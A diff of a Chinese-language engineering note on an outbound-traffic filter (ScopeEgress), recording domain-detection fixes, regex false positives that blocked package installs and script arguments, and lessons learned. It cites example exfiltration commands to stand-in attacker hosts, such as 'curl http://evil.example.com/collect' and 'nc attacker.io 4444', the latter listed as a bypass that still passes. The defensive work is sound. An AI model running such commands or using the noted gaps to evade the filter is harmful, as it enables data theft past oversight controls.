@@ -135,11 +135,24 @@
 - ~~**域名形式的外传目标从不被拦**~~（`curl http://evil.example.com/collect`
   不触发阻断）：`ScopeEgress` 只匹配 IP 规则。**r1016 已修**（域名只在 URL 主机位
   识别，不做裸点分词，否则 `cat README.md`、`v1.2.3` 全会被误判），**r1017 补齐
-  残留的裸主机+端口形态**。**两者已随 2026-10-11 16:34 的 2537（154）/2539（245）
+  残留的裸主机+端口形态**（**该形态已于 r1018 撤除**，见下）。
+  **两者已随 2026-10-11 16:34 的 2537（154）/2539（245）
   上线**——那两轮部署由并行会话执行，`37099db2` 是本仓提交，含 r1016/r1017。
   线上复验：`/v1/models` 对伪造 `sk-` token 已返回 401（修复前 200 + 615 个模型）。
   **关键设计**：默认公网可达即阻断，只豁免明确不可路由的主机
   （`.local/.internal/.cluster.local/.lan/.home.arpa` 等 + 单标签名）。
+- ★ **r1016/r1017 自身引入过两类大面积误伤（r1018 已修正，教训值得单独记）**：
+  r1016 的 `user@host` 正则把 `npm install lodash@4.17.21`、`go get x@v1.2.3`、
+  `cargo add serde@1.0.197` 等**装包命令整类阻断**（pkg@1.2.3 被当成 user@host，
+  且 `4.17.21` 走默认公网判定）；r1017 的「裸主机+空格+端口」正则把
+  `node server.js 8080`、`python3 main.py 100` **打死**。两条规则已撤除——
+  前者冗余（email 规则 + isNonExfiltrationEmailFragment 已覆盖），
+  后者与脚本调用**结构上不可区分**，默认阻断方向就是错的。
+  **教训**：把「锚定上下文」当成充分条件是错的——锚定之后那段文本**仍然未必是
+  主机**（`pkg@1.2.3` 的 `4.17.21`、`main.py` 都不是）。判据见
+  `TestR1017VersionSpecsAndScriptArgsAreNotDestinations`，谁再往提取器里加
+  「长得像主机」的形态会先撞上它。
+  **残留缺口**：`nc attacker.io 4444`、`curl evil.io/path`（无 scheme）仍放行。
 - ~~**email 形状的 `user@host` 误阻断内网目标**~~：`ssh deploy@build.corp.internal`
   整条 `output_policy_blocked`，而 `ssh ops@10.24.7.91` 放行——**同一操作，写 IP
   放行、写内网域名阻断**，与 dc63f19ff 同构。**r1017 已修**：豁免按**类型**分派，
